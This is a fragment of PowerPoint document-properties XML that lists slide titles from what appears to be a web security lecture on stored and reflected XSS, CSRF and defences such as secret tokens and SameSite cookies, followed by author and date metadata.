      <vt:lpstr>Stored XSS attack</vt:lpstr>
      <vt:lpstr>Stored XSS attack</vt:lpstr>
      <vt:lpstr>Stored XSS attack</vt:lpstr>
      <vt:lpstr>Stored XSS attack</vt:lpstr>
      <vt:lpstr>Stored XSS attack</vt:lpstr>
      <vt:lpstr>Stored XSS Summary</vt:lpstr>
      <vt:lpstr>Your friend and mine, Samy</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Reflected XSS Summary</vt:lpstr>
      <vt:lpstr>Preventing XSS</vt:lpstr>
      <vt:lpstr>CSRF</vt:lpstr>
      <vt:lpstr> How does CSRF work? </vt:lpstr>
      <vt:lpstr>URLs with side effects</vt:lpstr>
      <vt:lpstr>Exploiting URLs with side-effects</vt:lpstr>
      <vt:lpstr>Exploiting URLs with side-effects</vt:lpstr>
      <vt:lpstr>Exploiting URLs with side-effects</vt:lpstr>
      <vt:lpstr>Exploiting URLs with side-effects</vt:lpstr>
      <vt:lpstr>Exploiting URLs with side-effects</vt:lpstr>
      <vt:lpstr>Exploiting URLs with side-effects</vt:lpstr>
      <vt:lpstr>Exploiting URLs with side-effects</vt:lpstr>
      <vt:lpstr>Exploiting URLs with side-effects</vt:lpstr>
      <vt:lpstr>Exploiting URLs with side-effects</vt:lpstr>
      <vt:lpstr>Cross-Site Request Forgery</vt:lpstr>
      <vt:lpstr>Common defenses against CSRF</vt:lpstr>
      <vt:lpstr>Prevention: Referer Validation</vt:lpstr>
      <vt:lpstr>I visit reddit.com</vt:lpstr>
      <vt:lpstr>Defense: Secret token</vt:lpstr>
      <vt:lpstr>Defense: Secret token</vt:lpstr>
      <vt:lpstr>Defense: Secret token</vt:lpstr>
      <vt:lpstr>Introduction to Web Cookies</vt:lpstr>
      <vt:lpstr>Cookies Misuse Can Lead to Cross-site Request Forgery</vt:lpstr>
      <vt:lpstr>Cookies Misuse Can Lead to Cross-site Request Forgery</vt:lpstr>
      <vt:lpstr>Same-Site Cookie Attribute to Prevent CSRF Attacks</vt:lpstr>
      <vt:lpstr>XSS vs CSRF</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Asymmetric Ciphers</dc:title>
  <dc:creator>Abdullah</dc:creator>
  <cp:lastModifiedBy>Hasan Shah</cp:lastModifiedBy>
  <cp:revision>81</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2022-09-27T08:12:57Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2023-12-12T17:11:22Z</dcterms:modified>
</cp:coreProperties>
</file>